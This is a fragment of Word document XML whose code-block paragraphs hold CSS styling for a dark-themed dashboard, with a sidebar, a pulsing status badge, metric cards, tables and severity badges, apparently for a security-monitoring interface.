    <w:p w14:paraId="6AD9B2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CA2706F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EC01D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Sidebar Navigation --- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2C32C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.sidebar {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A581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width: 260px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6E3F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var(--bg-nav);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0997E11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border-right: 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A1D4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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3561A9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flex-direction: column;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB681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z-index: 100;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A96B6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2D7D642" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D4369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.logo-container {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3D11C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24px 20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17DF616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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA84DA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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B9254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gap: 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D865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border-bottom: 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33B3C1A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1219B6E2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F89B5F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.logo-container h1 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6115E7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 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="205CD4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18px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245ECA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700;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638F1E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letter-spacing: 0.5px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049CB84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B561233" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0004ED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.logo-subtitle {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58281D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11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15FF814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var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="060F4BB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700;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D8C44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text-transform: uppercase;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DEDFF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letter-spacing: 1px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E7C386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E8D1099" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34C2B2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.nav-menu {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C458D3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20px 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03477F3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flex: 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E7A9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1A6E1615" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C51E43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.nav-item {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CAD01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14px 24px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542CC2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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="543F5A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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8402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gap: 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C59A9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var(--text-muted);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CD54E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cursor: pointer;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3F5D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500;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE5EB0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14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62762C0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transition: all 0.2s;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A84FE0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border-left: 3px solid transparent;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1371A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3FBABE0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68FD573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.nav-item:hover {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A06A9B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rgba(255, 255, 255, 0.03);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA9FD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var(--text-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="306F8C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2715C50" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11EF52A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.nav-item.active {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25420E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rgba(59, 130, 246, 0.1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72307C4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var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491CCCB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border-left-color: var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E589E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0E92AF5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C21B52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Main Content Area --- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34302D5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.main-content {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3748C3E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flex: 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D90C94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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368606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flex-direction: column;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EBBE88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overflow: hidden;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D370C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F9A9347" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4810F6D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header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDA6D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var(--bg-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F982D8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16px 30px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C16640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border-bottom: 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="220893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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E14193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justify-content: space-between;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2419619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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC211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C135F2E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E373F7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.status-badge {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388A13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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="241B88A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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F55E5A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gap: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D58FF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font-family: 'JetBrains Mono', monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4DDF2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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2876FAB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rgba(12, 209, 91, 0.1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="777C271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var(--accent-green);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F5D3C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6px 14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C9B14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border-radius: 4px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A328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 1px solid rgba(12, 209, 91, 0.2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B53589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77B1F2E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5967FE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.pulse-dot {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A314D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width: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6225B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height: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4E83A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background-color: var(--accent-green);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1D55C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border-radius: 50%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7102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animation: pulse 2s infinite;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D6A392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F1F25E4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68FD99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@keyframes pulse {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6401748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0% {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E06E4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box-shadow: 0 0 0 0 rgba(12, 209, 91, 0.7);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF48B9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29AFC5C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6ED0489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70% {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477D834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box-shadow: 0 0 0 6px rgba(12, 209, 91, 0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3522EE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18256472" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D8B341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100% {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105B406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box-shadow: 0 0 0 0 rgba(12, 209, 91, 0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17C2C9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6CC0AE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CCB6D39" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="232A29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Tab Content containers --- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2376CA6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.tab-content {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3F4E4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none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AAA952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24px 30px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D286B6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overflow-y: auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72AC584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flex: 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C2A4A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E33A25D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DE8A1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.tab-content.active {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4092260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block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C9CE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5F998A7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03623C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Dashboard Grid --- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA8679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.metrics-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="599BFE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grid;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5088EA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grid-template-columns: repeat(4, 1fr);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8EDB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gap: 20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1687F0A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margin-bottom: 24px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78281C1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5CBA8DB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61199A1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.card {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E388D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var(--bg-card);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A96E6E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border-radius: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A25880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20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE1744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 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60359C0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position: relative;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B0B9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DB60EC4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C613F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.card-header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DD84C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var(--text-muted);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423C2D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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19AE15E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600;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468C33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text-transform: uppercase;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B8DD4F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margin-bottom: 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3061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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A12733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justify-content: space-between;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60DAB2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0EEDD2B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26A7990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.metric-value {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A69C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28px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D476D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700;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E06E4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var(--text-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F34E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618FF8A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="181031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.top-acc-blue {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="403BF96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border-top: 3px solid var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57DB744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19099B4C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2097669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.top-acc-green {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B484AC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border-top: 3px solid var(--accent-green);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F68D76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41B9B74" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3227643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.top-acc-red {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3D73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border-top: 3px solid var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C8D21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D4A11AC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D94D0D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 --- Tables --- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511CD4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.table-card {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1A7AF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var(--bg-card);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44ECAF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 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="471A48B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border-radius: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="566397A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overflow: hidden;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45BDA3F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1748A482" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58DBDE4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.table-header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05EB15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16px 20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A387F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border-bottom: 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA3F3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600;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECA47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rgba(0, 0, 0, 0.2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2123933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CD384A9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="099545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table {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA66D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width: 100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B935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border-collapse: collapse;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0946F4E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text-align: left;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022EF82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EF196CD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="753312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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="435ED1B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var(--text-muted);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A0B69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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B89BF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text-transform: uppercase;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9312B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12px 20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B412F7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border-bottom: 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC6212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1F19413" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BCA99B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td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76788C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12px 20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09AB38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border-bottom: 1px solid rgba(42, 46, 63, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B64C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13px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="548E93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CAF7835" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72A388E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tr:hover td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C900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rgba(255, 255, 255, 0.02);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6814F59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71E0157" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="252620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.mono {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42BA9E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font-family: 'JetBrains Mono', monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C531A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B3E1772" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4816669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.badge {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6A00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4px 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A1117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border-radius: 4px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35274D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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD1667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700;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5411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text-transform: uppercase;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="372415E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E6868D2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="068A4BC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.bg-CRITICAL {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028B001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rgba(239, 68, 68, 0.15);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="298E6B0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var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57AD107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 1px solid rgba(239, 68, 68, 0.3);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255D67B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B5FCF90" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75AA8E1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.bg-HIGH {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1B07B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rgba(245, 158, 11, 0.15);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4702CF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var(--accent-orange);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D645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 1px solid rgba(245, 158, 11, 0.3);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2442E0D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4B767E0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B18CDD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.bg-SCAN {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="019CDC2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rgba(139, 92, 246, 0.15);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B6057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var(--accent-purple);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FC0B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 1px solid rgba(139, 92, 246, 0.3);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E59F89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CA2B0E3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0868F43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.bg-INFO {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6DD6A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rgba(59, 130, 246, 0.15);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D04A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var(--accent-blue);</w:t>
      </w:r>
    </w:p>
